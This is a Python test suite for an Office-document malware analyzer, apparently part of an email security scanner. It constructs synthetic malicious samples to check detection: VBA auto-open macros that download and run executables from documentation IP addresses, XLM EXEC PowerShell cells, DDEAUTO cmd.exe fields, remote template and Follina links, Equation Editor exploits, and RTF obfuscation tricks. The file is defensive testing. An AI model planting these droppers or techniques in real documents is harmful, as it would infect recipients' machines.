from __future__ import annotations

import binascii
import hashlib
import io
import random
import struct
import time
import zipfile

import pytest

from centinela.analyzers.office import (
    OfficeAnalyzer,
    _classify_target,
    _extract_body_passwords,
    _rtf_scan,
    _stomping_from_pcode,
    _unquote_field,
)
from centinela.core.models import Artifact, FindingCategory, ParsedMessage, Severity
from tests.analyzers_docs._samples import (
    EQUATION3_CLSID,
    OLE_MAGIC,
    Node,
    build_cfb,
    fake_pe,
    ole1_object,
    ole10native,
    ooxml,
    ovba_compress_literal,
    paragraph,
    rels,
    url_moniker_stream,
    word_document,
)
from tests.helpers import make_artifact, make_ref


@pytest.fixture
def analyzer(settings):
    return OfficeAnalyzer(settings)


async def run(
    analyzer, make_ctx, data, filename="doc.docx", detected_type="ooxml", message=None, art_id="att0"
):
    art = make_artifact(data, filename, detected_type, id=art_id)
    if message is not None:
        message.artifacts.insert(0, art)
    findings = await analyzer.analyze(make_ctx(message), art)
    rules = [f.rule for f in findings]
    assert len(rules) == len(set(rules)), (
        "un analizador no debe repetir regla por artifact (dedupe del pipeline)"
    )
    for f in findings:
        assert f.analyzer == "office"
        assert f.rule.startswith("office.")
        assert f.title and f.description
        assert f.artifact_id == art_id
    return {f.rule: f for f in findings}


# --------------------------------------------------------------------------- accepts


def test_available():
    assert OfficeAnalyzer.available()


def test_accepts(analyzer):
    assert analyzer.accepts(make_artifact(b"x", "a.bin", "ole"))
    assert analyzer.accepts(make_artifact(b"x", "a.bin", "ooxml"))
    assert analyzer.accepts(make_artifact(b"x", "a.bin", "rtf"))
    assert analyzer.accepts(make_artifact(b"x", "a.bas", "script/vba"))
    assert analyzer.accepts(make_artifact(b"MZ", "factura.xlsm", "pe"))  # por extensión
    assert not analyzer.accepts(make_artifact(b"MZ", "factura.exe", "pe"))
    assert not analyzer.accepts(make_artifact(b"%PDF-1.7", "a.pdf", "pdf"))
    flat = (
        b'<?xml version="1.0"?><pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage"/>'
    )
    assert analyzer.accepts(make_artifact(flat, "a.xml", "xml"))
    # una factura electrónica XML (CFDI / AFIP) no es Office: no se analiza
    cfdi = b'<?xml version="1.0"?><cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Total="100"/>'
    assert not analyzer.accepts(make_artifact(cfdi, "factura.xml", "xml"))


async def test_listing_only_entries_are_skipped(analyzer, make_ctx):
    # "factura.docm" visto dentro de un zip cifrado: no hay contenido que abrir (lo cubre filetype por el nombre)
    listed = Artifact(id="att0/factura.docm", filename="factura.docm", size=40_000, depth=1, parent_id="att0",
                      listing_only=True)  # fmt: skip
    assert not analyzer.accepts(listed)
    assert await analyzer.analyze(make_ctx(), listed) == []
    weird = make_artifact(b"\xd0\xcf\x11\xe0" + b"\x00" * 600, "a.doc", "ole").model_copy(
        update={"listing_only": True}
    )
    assert not analyzer.accepts(weird)
    assert await analyzer.analyze(make_ctx(), weird) == []


async def test_listing_only_children_hashes_are_ignored(analyzer, make_ctx):
    # los hijos "solo listados" no tienen hash: no deben colarse como "hash vacío" en el análisis del padre
    listed = Artifact(id="att0/oleObject1.bin", filename="oleObject1.bin", depth=1, parent_id="att0",
                      listing_only=True)  # fmt: skip
    m = ParsedMessage(ref=make_ref(), artifacts=[listed])
    out = await run(
        analyzer, make_ctx, ooxml({"word/document.xml": word_document(paragraph("Hola"))}), message=m
    )
    assert isinstance(out, dict)


# --------------------------------------------------------------------------- VBA


async def test_vba_autoexec_shell_download_is_high(analyzer, make_ctx):
    src = (
        b'Attribute VB_Name = "ThisDocument"\r\n'
        b"Sub Document_Open()\r\n"
        b'    Dim u As String: u = "http://198.51.100.7/payload.exe"\r\n'
        b'    URLDownloadToFile 0, u, Environ("TEMP") & "\\a.exe", 0, 0\r\n'
        b'    CreateObject("WScript.Shell").Run "cmd /c " & Environ("TEMP") & "\\a.exe", 0\r\n'
        b"End Sub\r\n"
    )
    res = await run(analyzer, make_ctx, src, "modulo.bas", "script/vba")
    f = res["office.vba.autoexec"]
    assert f.severity == Severity.HIGH
    assert 60 <= f.score <= 85
    ev = f.evidence
    assert "Document_Open" in ev["autoejecucion"]
    assert "descarga" in ev["indicadores"]
    assert any("198.51.100.7" in i for i in ev["iocs"])
    assert "office.vba.macros" not in res  # una sola calificación de VBA por artifact


async def test_vba_dangerous_without_autoexec_is_medium(analyzer, make_ctx):
    src = b'Sub Procesar()\r\n    Shell "powershell -nop -c Get-Date", vbHide\r\nEnd Sub\r\n'
    res = await run(analyzer, make_ctx, src, "m.bas", "script/vba")
    f = res["office.vba.suspicious"]
    assert f.severity == Severity.MEDIUM


async def test_vba_benign_macro_only_medium_low_score(analyzer, make_ctx):
    src = b'Sub Totales()\r\n    Range("A1").Value = WorksheetFunction.Sum(Range("B1:B10"))\r\nEnd Sub\r\n'
    res = await run(analyzer, make_ctx, src, "m.bas", "script/vba")
    assert set(res) == {"office.vba.macros"}
    assert res["office.vba.macros"].score <= 30


async def test_vba_only_attribute_lines_is_not_a_macro(analyzer, make_ctx):
    src = b'Attribute VB_Name = "ThisDocument"\r\nAttribute VB_Base = "1Normal.ThisDocument"\r\n'
    res = await run(analyzer, make_ctx, src, "m.bas", "script/vba")
    assert res == {}


async def test_vba_chr_obfuscation_noted(analyzer, make_ctx):
    chrs = " & ".join(f"Chr({c})" for c in b"powershell -enc AAAA")
    src = f"Sub AutoOpen()\r\n    x = {chrs}\r\n    Shell x\r\nEnd Sub\r\n".encode()
    res = await run(analyzer, make_ctx, src, "m.bas", "script/vba")
    f = res["office.vba.autoexec"]
    assert f.evidence["llamadas_chr"] >= 15
    assert "ofuscado" in f.description


def _doc_with_vba_module(source: bytes) -> bytes:
    # "P-code" ficticio + código fuente comprimido AL FINAL del stream (sin relleno detrás)
    compressed = ovba_compress_literal(source)
    module = b"\x00" * max(32, 4096 - len(compressed)) + compressed
    return build_cfb(
        [
            Node("WordDocument", b"\xec\xa5" + b"\x00" * 100),
            Node("Macros", None, children=[Node("VBA", None, children=[Node("ThisDocument", module)])]),
        ]
    )


async def test_vba_inside_legacy_doc(analyzer, make_ctx):
    src = (
        b'Attribute VB_Name = "ThisDocument"\r\n'
        b"Private Sub Document_Open()\r\n"
        b'    Set x = CreateObject("MSXML2.XMLHTTP")\r\n'
        b'    x.Open "GET", "http://198.51.100.8/r.txt", False\r\n'
        b"    x.Send\r\n"
        b'    Shell "powershell -nop -c " & x.responseText, 0\r\n'
        b"End Sub\r\n"
    )
    res = await run(analyzer, make_ctx, _doc_with_vba_module(src), "pedido.doc", "ole")
    f = res["office.vba.autoexec"]
    assert f.severity == Severity.HIGH and f.score >= 80
    assert f.evidence["donde"] == ["documento"]


async def test_benign_vba_inside_legacy_doc(analyzer, make_ctx):
    src = b'Attribute VB_Name = "ThisDocument"\r\nSub Formatear()\r\n    Selection.Font.Bold = True\r\nEnd Sub\r\n'
    res = await run(analyzer, make_ctx, _doc_with_vba_module(src), "plantilla.doc", "ole")
    assert set(res) == {"office.vba.macros"}
    assert res["office.vba.macros"].severity == Severity.MEDIUM


def test_stomping_detection_logic():
    pcode = '\tLd Shell\n\tLitStr 0x0004 "calc"\n\tArgsCall Shell 0x0001\n\tSt payload\n'
    benign_source = "Sub AutoOpen()\n    MsgBox 1\nEnd Sub\n"
    assert _stomping_from_pcode(pcode, benign_source)
    honest_source = 'Sub AutoOpen()\n    payload = "calc"\n    Shell payload\nEnd Sub\n'
    assert not _stomping_from_pcode(pcode, honest_source)
    assert _stomping_from_pcode(pcode, 'Attribute VB_Name = "Module1"\n')  # P-code sin fuente
    assert not _stomping_from_pcode("Processing file\n", benign_source)  # sin P-code no se concluye nada


# --------------------------------------------------------------------------- OOXML: plantillas remotas, Follina, DDE


async def test_docx_remote_template_injection(analyzer, make_ctx):
    data = ooxml(
        {
            "word/document.xml": word_document(paragraph("Factura adjunta")),
            "word/settings.xml": f'<w:settings {sample_ns()}><w:attachedTemplate r:id="rId1"/></w:settings>',
            "word/_rels/settings.xml.rels": rels(
                ("attachedTemplate", "http://203.0.113.5/plantilla.dotm", "External")
            ),
        }
    )
    res = await run(analyzer, make_ctx, data)
    f = res["office.remote_template"]
    assert f.severity == Severity.HIGH and f.score >= 70
    assert "203.0.113.5" in f.evidence["relaciones"][0]["destino"]


def sample_ns() -> str:
    return (
        'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
    )


async def test_docx_unc_template_from_external_vs_internal_sender(analyzer, make_ctx):
    data = ooxml(
        {
            "word/document.xml": word_document(paragraph("x")),
            "word/_rels/settings.xml.rels": rels(
                ("attachedTemplate", "file://198.51.100.20/share/t.dotm", "External")
            ),
        }
    )
    res = await run(analyzer, make_ctx, data)
    assert res["office.remote_template"].severity == Severity.HIGH
    internal = ParsedMessage(ref=make_ref(), from_addr="juan@empresa.com")
    res = await run(analyzer, make_ctx, data, message=internal)
    assert (
        res["office.remote_template"].severity == Severity.MEDIUM
    )  # plantilla en el file server de la empresa


async def test_docx_sharepoint_macro_free_template_is_low(analyzer, make_ctx):
    data = ooxml(
        {
            "word/document.xml": word_document(paragraph("x")),
            "word/_rels/settings.xml.rels": rels(
                (
                    "attachedTemplate",
                    "https://contoso.sharepoint.com/sites/x/Plantillas/membrete.dotx",
                    "External",
                )
            ),
        }
    )
    res = await run(analyzer, make_ctx, data)
    assert res["office.remote_template"].score <= 10


async def test_docx_follina(analyzer, make_ctx):
    data = ooxml(
        {
            "word/document.xml": word_document(paragraph("Curriculum")),
            "word/_rels/document.xml.rels": rels(
                ("styles", "styles.xml", None), ("oleObject", "http://203.0.113.5/index.html!", "External")
            ),
        }
    )
    res = await run(analyzer, make_ctx, data)
    f = res["office.follina"]
    assert f.severity == Severity.HIGH and f.score == 85
    assert "CVE-2022-30190" in f.evidence["cve"]


async def test_docx_mhtml_target(analyzer, make_ctx):
    data = ooxml(
        {
            "word/document.xml": word_document(paragraph("x")),
            "word/_rels/document.xml.rels": rels(
                ("oleObject", "mhtml:http://203.0.113.5/x.html!x-usc:http://203.0.113.5/x.html", "External")
            ),
        }
    )
    res = await run(analyzer, make_ctx, data)
    assert "office.follina" in res


async def test_docx_entity_obfuscated_target(analyzer, make_ctx):
    # "mhtml:" escrito con referencias de carácter XML
    target = "&#109;&#104;&#116;&#109;&#108;:http://203.0.113.5/a.html!"
    data = ooxml(
        {
            "word/document.xml": word_document(paragraph("x")),
            "word/_rels/document.xml.rels": rels(("oleObject", target, "External")),
        }
    )
    res = await run(analyzer, make_ctx, data)
    assert "office.follina" in res


async def test_benign_docx_with_hyperlinks_only_has_no_findings(analyzer, make_ctx):
    body = paragraph("Estimado cliente, adjuntamos el presupuesto.") + paragraph("Saludos")
    data = ooxml(
        {
            "word/document.xml": word_document(body),
            "word/_rels/document.xml.rels": rels(
                ("styles", "styles.xml", None),
                ("hyperlink", "https://www.afip.gob.ar/", "External"),
                ("hyperlink", "\\\\servidor\\compartido\\x.docx", "External"),
                ("image", "media/image1.png", None),
            ),
            "word/styles.xml": "<w:styles/>",
        }
    )
    res = await run(analyzer, make_ctx, data)
    assert res == {}


async def test_docx_ddeauto_split_across_runs(analyzer, make_ctx):
    field = (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> DDE</w:instrText></w:r>'
        '<w:r><w:instrText xml:space="preserve">AUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    res = await run(analyzer, make_ctx, ooxml({"word/document.xml": word_document(field)}))
    f = res["office.dde"]
    assert f.severity == Severity.HIGH and f.score == 80
    assert "cmd.exe" in f.evidence["vinculos"][0]["comando"]


async def test_docx_dde_hidden_with_quote_field(analyzer, make_ctx):
    codes = " ".join(str(ord(c)) for c in "DDEAUTO c:\\windows\\system32\\cmd.exe /c calc")
    field = (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve">QUOTE {codes}</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    res = await run(analyzer, make_ctx, ooxml({"word/document.xml": word_document(field)}))
    assert "office.dde" in res


async def test_docx_benign_fields_are_not_dde(analyzer, make_ctx):
    fields = (
        '<w:p><w:fldSimple w:instr=" PAGE   \\* MERGEFORMAT "><w:r><w:t>1</w:t></w:r></w:fldSimple></w:p>'
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText> HYPERLINK "https://example.com/dde/info" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    res = await run(analyzer, make_ctx, ooxml({"word/document.xml": word_document(fields)}))
    assert res == {}


def test_unquote_field():
    assert _unquote_field("QUOTE 68 68 69") == "DDE"
    assert _unquote_field("PAGE") == "PAGE"


def test_classify_target():
    assert _classify_target("http://x/y.dotm") == "http"
    assert _classify_target("\\\\host\\share\\t.dotm") == "unc"
    assert _classify_target("file:///\\\\host\\share\\t.dotm") == "unc"
    assert _classify_target("file:///C:/Users/x/Normal.dotm") is None
    assert _classify_target("ms-msdt:/id PCWDiagnostic") == "follina"
    assert _classify_target("search-ms:query=x") == "protocol"
    assert _classify_target("media/image1.png") is None


# --------------------------------------------------------------------------- OOXML: Excel


XLSX_CT = (
    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>'
    "</Types>"
)


async def test_xlsm_xlm_auto_open_exec_hidden(analyzer, make_ctx):
    data = ooxml(
        {
            "xl/workbook.xml": (
                '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets>'
                '<sheet name="Hoja1" sheetId="1" r:id="rId1"/>'
                '<sheet name="Macro1" sheetId="2" state="veryHidden" r:id="rId2"/></sheets>'
                '<definedNames><definedName name="_xlnm.Auto_Open" hidden="1">Macro1!$A$1</definedName>'
                "</definedNames></workbook>"
            ),
            "xl/macrosheets/sheet1.xml": (
                '<xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData>'
                '<row r="1"><c r="A1"><f>EXEC("cmd /c powershell -w hidden iwr http://198.51.100.3/a")</f></c></row>'
                '<row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></xm:macrosheet>'
            ),
        },
        content_types=XLSX_CT,
    )
    res = await run(analyzer, make_ctx, data, "planilla.xlsm")
    f = res["office.xlm.autoexec"]
    assert f.severity == Severity.HIGH and f.score >= 80
    assert "EXEC" in f.evidence["funciones_peligrosas"]
    assert f.evidence["hoja_muy_oculta"] is True


async def test_xlsx_dde_link_and_formula(analyzer, make_ctx):
    data = ooxml(
        {
            "xl/workbook.xml": '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>',
            "xl/externalLinks/externalLink1.xml": (
                '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                '<ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>'
            ),
        }
    )
    res = await run(analyzer, make_ctx, data, "a.xlsx")
    assert res["office.dde"].severity == Severity.HIGH

    data = ooxml(
        {
            "xl/worksheets/sheet1.xml": (
                '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1">'
                "<c r=\"A1\"><f>cmd|'/c powershell -w hidden'!A0</f></c>"
                '<c r="B1"><f>SUM(A2:A9)</f></c></row></sheetData></worksheet>'
            )
        }
    )
    res = await run(analyzer, make_ctx, data, "b.xlsx")
    assert "office.dde" in res


async def test_xlsx_benign_formulas(analyzer, make_ctx):
    data = ooxml(
        {
            "xl/worksheets/sheet1.xml": (
                '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1">'
                '<c r="A1"><f>SUM(B1:B20)*IVA</f></c><c r="A2"><f>IF(A1&gt;0,"ok","x")</f></c></row></sheetData>'
                "</worksheet>"
            )
        }
    )
    res = await run(analyzer, make_ctx, data, "b.xlsx")
    assert res == {}


async def test_slk_disguised_as_xls(analyzer, make_ctx):
    slk = b'ID;P\r\nO;E\r\nNN;NAuto_open;ER1C1\r\nC;X1;Y1;K0;EEXEC("cmd /c calc")\r\nC;X1;Y2;K0;EHALT()\r\nE\r\n'
    res = await run(analyzer, make_ctx, slk, "pedido.xls", "text")
    assert res["office.xlm.autoexec"].severity == Severity.HIGH


# --------------------------------------------------------------------------- OLE (legacy)


async def test_ole_equation_editor_cve_2017_11882(analyzer, make_ctx):
    data = build_cfb(
        [Node("Equation Native", b"\x1c\x00\x00\x00" + b"\x41" * 200)], root_clsid=EQUATION3_CLSID
    )
    res = await run(analyzer, make_ctx, data, "pedido.doc", "ole")
    f = res["office.cve_2017_11882"]
    assert f.severity == Severity.HIGH and f.score == 80
    assert "CVE-2017-11882" in f.evidence["cve"]


async def test_ole_package_with_executable(analyzer, make_ctx):
    pkg = ole10native("factura.pdf.exe", "C:\\factura.pdf.exe", "C:\\Temp\\factura.pdf.exe", fake_pe())
    data = build_cfb(
        [
            Node("WordDocument", b"\xec\xa5" + b"\x00" * 500),
            Node("ObjectPool", None, children=[Node("_1", None, children=[Node("\x01Ole10Native", pkg)])]),
        ]
    )
    res = await run(analyzer, make_ctx, data, "doc.doc", "ole")
    f = res["office.ole_package_executable"]
    assert f.severity == Severity.HIGH and f.score == 80
    assert f.evidence["paquetes"][0]["nombre"] == "factura.pdf.exe"


async def test_ole_url_moniker_cve_2017_0199(analyzer, make_ctx):
    data = build_cfb([Node("\x01Ole", url_moniker_stream("http://198.51.100.9/plantilla.hta"))])
    res = await run(analyzer, make_ctx, data, "doc.doc", "ole")
    f = res["office.cve_2017_0199"]
    assert f.severity == Severity.HIGH
    assert "198.51.100.9" in f.evidence["objetos"][0]["url"]


async def test_ole_doc_dde_field(analyzer, make_ctx):
    stream = (
        b"\x00" * 64
        + b'\x13 DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" \x14resultado\x15'
        + b"\x00" * 64
    )
    data = build_cfb([Node("WordDocument", stream)])
    res = await run(analyzer, make_ctx, data, "doc.doc", "ole")
    assert res["office.dde"].score == 80


def _biff_record(rtype: int, data: bytes) -> bytes:
    return struct.pack("<HH", rtype, len(data)) + data


async def test_xls_dde_supbook(analyzer, make_ctx):
    path = b"cmd\x03/c calc"
    supbook = struct.pack("<HH", 0, len(path)) + b"\x00" + path  # ctab=0 => fuente OLE/DDE
    workbook = (
        _biff_record(0x0809, struct.pack("<HHHHII", 0x0600, 0x0005, 0, 0, 0, 0))
        + _biff_record(430, supbook)
        + _biff_record(0x000A, b"")
    )
    data = build_cfb([Node("Workbook", workbook)])
    res = await run(analyzer, make_ctx, data, "pedido.xls", "ole")
    f = res["office.dde"]
    assert f.score == 80
    assert "cmd" in f.evidence["vinculos"][0]["comando"]


async def test_xls_xlm_macro_sheet_auto_open(analyzer, make_ctx):
    workbook = (
        _biff_record(0x0809, struct.pack("<HHHHII", 0x0600, 0x0005, 0, 0, 0, 0))
        + _biff_record(0x85, struct.pack("<IBB", 0, 2, 1) + bytes([6, 0]) + b"Macro1")  # hoja XLM muy oculta
        + _biff_record(0x18, bytes([0x20, 0, 0, 1, 0, 0]) + b"\x00" * 8 + b"\x00\x01")  # nombre Auto_Open
        + _biff_record(0x000A, b"")
    )
    data = build_cfb([Node("Workbook", workbook)], root_clsid="00020820-0000-0000-C000-000000000046")
    res = await run(analyzer, make_ctx, data, "pedido.xls", "ole")
    f = res["office.xlm.suspicious"]
    assert f.severity == Severity.MEDIUM and f.score == 55
    assert f.evidence["autoejecucion"] is True and f.evidence["hoja_muy_oculta"] is True


async def test_docm_vba_project(analyzer, make_ctx):
    src = b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n    Shell "cmd /c calc", 0\r\nEnd Sub\r\n'
    compressed = ovba_compress_literal(src)
    project = build_cfb(
        [Node("VBA", None, children=[Node("ThisDocument", b"\x00" * (4096 - len(compressed)) + compressed)])]
    )
    data = ooxml({"word/document.xml": word_document(paragraph("x")), "word/vbaProject.bin": project})
    res = await run(analyzer, make_ctx, data, "pedido.docm")
    f = res["office.vba.autoexec"]
    assert f.evidence["donde"] == ["word/vbaProject.bin"]


async def test_xls_garbage_workbook_stream(analyzer, make_ctx):
    data = build_cfb([Node("Workbook", random.Random(5).randbytes(6000))])
    res = await run(analyzer, make_ctx, data, "x.xls", "ole")
    assert all(f.severity <= Severity.LOW for f in res.values())


async def test_ole_activex(analyzer, make_ctx):
    data = build_cfb(
        [
            Node("WordDocument", b"\x00" * 10),
            Node(
                "ObjectPool",
                None,
                children=[
                    Node("_9", None, children=[Node("\x03OCXNAME", "InkPicture1".encode("utf-16-le"))])
                ],
            ),
        ]
    )
    res = await run(analyzer, make_ctx, data, "doc.doc", "ole")
    assert res["office.activex"].severity == Severity.MEDIUM


async def test_benign_ole_has_no_findings(analyzer, make_ctx):
    text = "Estimado cliente, adjuntamos la factura del mes.".encode("utf-16-le")
    data = build_cfb([Node("WordDocument", b"\xec\xa5" + b"\x00" * 30 + text), Node("1Table", b"\x00" * 100)])
    res = await run(analyzer, make_ctx, data, "carta.doc", "ole")
    assert res == {}


async def test_malformed_ole_is_handled(analyzer, make_ctx):
    data = OLE_MAGIC + bytes(random.Random(1).randbytes(3000))
    res = await run(analyzer, make_ctx, data, "x.doc", "ole")
    assert all(f.severity <= Severity.LOW for f in res.values())
    assert set(res) <= {"office.parse_error", "office.partial_analysis"}


# --------------------------------------------------------------------------- objetos incrustados en OOXML


def _docx_with_embedding(blob: bytes) -> bytes:
    return ooxml(
        {
            "word/document.xml": word_document(paragraph("Ver adjunto")),
            "word/embeddings/oleObject1.bin": blob,
        }
    )


async def test_docx_embedded_package_not_extracted_is_flagged_on_parent(analyzer, make_ctx):
    pkg = ole10native(
        "comprobante.js", "C:\\comprobante.js", "C:\\Temp\\comprobante.js", b"WScript.Echo('x');"
    )
    blob = build_cfb([Node("\x01Ole10Native", pkg)])
    res = await run(analyzer, make_ctx, _docx_with_embedding(blob))
    assert res["office.ole_package_executable"].score == 75
    assert res["office.embedded_objects"].severity == Severity.INFO


async def test_docx_embedded_package_already_extracted_is_not_double_counted(analyzer, make_ctx):
    pkg = ole10native(
        "comprobante.js", "C:\\comprobante.js", "C:\\Temp\\comprobante.js", b"WScript.Echo('x');"
    )
    blob = build_cfb([Node("\x01Ole10Native", pkg)])
    child = make_artifact(
        blob, "oleObject1.bin", "ole", id="att0/word/embeddings/oleObject1.bin", depth=1, parent_id="att0"
    )
    message = ParsedMessage(ref=make_ref(), artifacts=[child])
    res = await run(analyzer, make_ctx, _docx_with_embedding(blob), message=message)
    assert "office.ole_package_executable" not in res
    emb = res["office.embedded_objects"]
    assert emb.evidence["objetos"][0]["analizado_aparte"] is True
    # y el hijo, analizado por su cuenta, sí lo marca
    res_child = await run(analyzer, make_ctx, blob, "oleObject1.bin", "ole", art_id=child.id)
    assert "office.ole_package_executable" in res_child


# --------------------------------------------------------------------------- cifrado


def _encrypt_ooxml(plain: bytes, password: str) -> bytes:
    from msoffcrypto.format.ooxml import OOXMLFile

    out = io.BytesIO()
    OOXMLFile(io.BytesIO(plain)).encrypt(password, out)
    return out.getvalue()


def _follina_docx() -> bytes:
    # > 4 KB comprimido (texto no compresible): msoffcrypto no descifra paquetes que caen en el mini stream
    rnd = random.Random(5)
    filler = paragraph("".join(rnd.choice("abcdefghijklmnopqrstuvwxyz ") for _ in range(12000)))
    return ooxml(
        {
            "word/document.xml": word_document(filler),
            "word/_rels/document.xml.rels": rels(("oleObject", "http://203.0.113.5/index.html!", "External")),
        }
    )


async def test_encrypted_ooxml_without_password(analyzer, make_ctx):
    data = _encrypt_ooxml(_follina_docx(), "Zq9!kLmP-7")
    assert data.startswith(OLE_MAGIC)
    res = await run(analyzer, make_ctx, data, "factura.docx", "ole")
    f = res["office.encrypted"]
    assert f.severity == Severity.MEDIUM and f.score == 35
    assert f.category == FindingCategory.POLICY
    assert "office.follina" not in res  # no se puede ver adentro


async def test_encrypted_ooxml_decrypted_with_password_from_body(analyzer, make_ctx):
    data = _encrypt_ooxml(_follina_docx(), "Factura2024")
    message = ParsedMessage(
        ref=make_ref(), body_text="Le envío la factura. La clave es Factura2024. Saludos."
    )
    res = await run(analyzer, make_ctx, data, "factura.docx", "ole", message=message)
    assert res["office.encrypted"].evidence["descifrado"] is True
    assert res["office.encrypted"].score == 25
    assert "office.follina" in res  # se analizó el contenido descifrado
    assert "Factura2024" not in str(res["office.encrypted"].evidence)  # la clave no queda en la evidencia


def test_body_password_extraction():
    assert _extract_body_passwords("La contraseña: Abc123. Saludos") == ["Abc123"]
    assert "4455" in _extract_body_passwords("clave del archivo 4455")
    assert _extract_body_passwords("Hola, ¿cómo estás?") == []


# --------------------------------------------------------------------------- RTF


def _rtf_with_object(obj: bytes, *, extra: bytes = b"\\objemb") -> bytes:
    hexdata = binascii.hexlify(obj)
    lines = b"\r\n".join(hexdata[i : i + 64] for i in range(0, len(hexdata), 64))
    return (
        b"{\\rtf1\\ansi{\\object"
        + extra
        + b"{\\*\\objclass Equation.3}\\objw380\\objh260{\\*\\objdata "
        + lines
        + b"}}}"
    )


async def test_rtf_equation_editor_objupdate(analyzer, make_ctx):
    rtf = _rtf_with_object(ole1_object(b"Equation.3", b"\x1c\x00" + b"A" * 300), extra=b"\\objemb\\objupdate")
    res = await run(analyzer, make_ctx, rtf, "pedido.doc", "rtf")
    assert res["office.cve_2017_11882"].score == 80
    assert res["office.rtf.objupdate"].severity == Severity.MEDIUM


async def test_rtf_obfuscated_objdata_still_detected(analyzer, make_ctx):
    cfb = build_cfb([Node("Equation Native", b"\x1c\x00" + b"B" * 100)], root_clsid=EQUATION3_CLSID)
    obj = ole1_object(b"Word.Document.8", cfb)
    h = binascii.hexlify(obj)
    k = 40  # trozo en \bin crudo
    mid = 200
    obf = (
        h[:mid]
        + b"\r\n{\\*\\bkmkstart abcdef}"  # destino anidado con letras "hex" que NO deben sumarse
        + b"0\\'4a"  # truco \'hh: el dígito impar se descarta
        + h[mid : mid + 2 * k]
        + b"\\bin"
        + str(k).encode()
        + b" "
        + obj[mid // 2 + k : mid // 2 + 2 * k]
        + h[mid + 4 * k :]
    )
    rtf = b"{\\rtf1{\\object\\objemb{\\*\\objdata " + obf + b"}}}"
    res = await run(analyzer, make_ctx, rtf, "x.rtf", "rtf")
    assert "office.cve_2017_11882" in res
    assert "office.rtf.obfuscation" in res


async def test_rtf_broken_ole1_header_falls_back_to_embedded_cfb(analyzer, make_ctx):
    cfb = build_cfb([Node("Equation Native", b"\x1c\x00" + b"C" * 100)], root_clsid=EQUATION3_CLSID)
    broken = b"\x01\x05\x00\x00\x02\x00\x00\x00\xff\xff\xff\x7f" + cfb
    rtf = b"{\\rtf1{\\object{\\*\\objdata " + binascii.hexlify(broken) + b"}}}"
    res = await run(analyzer, make_ctx, rtf, "x.rtf", "rtf")
    assert "office.cve_2017_11882" in res


async def test_rtf_package_with_script(analyzer, make_ctx):
    body = ole10native("Factura.js", "C:\\Factura.js", "C:\\Temp\\Factura.js", b"var s=1;", with_size=False)
    rtf = (
        b"{\\rtf1{\\object\\objemb{\\*\\objclass Package}{\\*\\objdata "
        + binascii.hexlify(ole1_object(b"Package", body))
        + b"}}}"
    )
    res = await run(analyzer, make_ctx, rtf, "x.rtf", "rtf")
    assert res["office.ole_package_executable"].evidence["paquetes"][0]["nombre"] == "Factura.js"


async def test_rtf_ddeauto_and_template(analyzer, make_ctx):
    rtf = (
        b'{\\rtf1{\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"}{\\fldrslt x}}'
        b"{\\*\\template http://203.0.113.7/t.dotm}Hola}"
    )
    res = await run(analyzer, make_ctx, rtf, "x.rtf", "rtf")
    assert res["office.dde"].score == 80
    assert res["office.remote_template"].severity == Severity.HIGH


async def test_rtf_ole2link(analyzer, make_ctx):
    cfb = build_cfb([Node("\x01Ole", url_moniker_stream("http://198.51.100.9/doc.hta"))])
    rtf = (
        b"{\\rtf1{\\object\\objautlink{\\*\\objdata "
        + binascii.hexlify(ole1_object(b"OLE2Link", cfb))
        + b"}}}"
    )
    res = await run(analyzer, make_ctx, rtf, "x.rtf", "rtf")
    assert "office.cve_2017_0199" in res
    assert "office.rtf.objupdate" in res


async def test_benign_rtf(analyzer, make_ctx):
    rtf = b"{\\rtf1\\ansi{\\fonttbl{\\f0 Arial;}}\\f0\\fs22 Estimado cliente,\\par adjuntamos la cotizaci\\'f3n.\\par}"
    res = await run(analyzer, make_ctx, rtf, "carta.rtf", "rtf")
    assert res == {}


async def test_adversarial_rtf_is_linear(analyzer, make_ctx):
    braces = b"{\\rtf1{\\object{\\*\\objdata " + b"01{}" * 300_000 + b"}}}"
    t0 = time.perf_counter()
    res = await run(analyzer, make_ctx, braces, "x.rtf", "rtf")
    assert time.perf_counter() - t0 < 20
    assert all(f.severity <= Severity.MEDIUM for f in res.values())
    deep = b"{\\rtf1" + b"{" * 100_000 + b"x" + b"}" * 100_000 + b"}"
    res = await run(analyzer, make_ctx, deep, "y.rtf", "rtf")
    assert res == {}


def test_rtf_scan_ignores_nested_destinations():
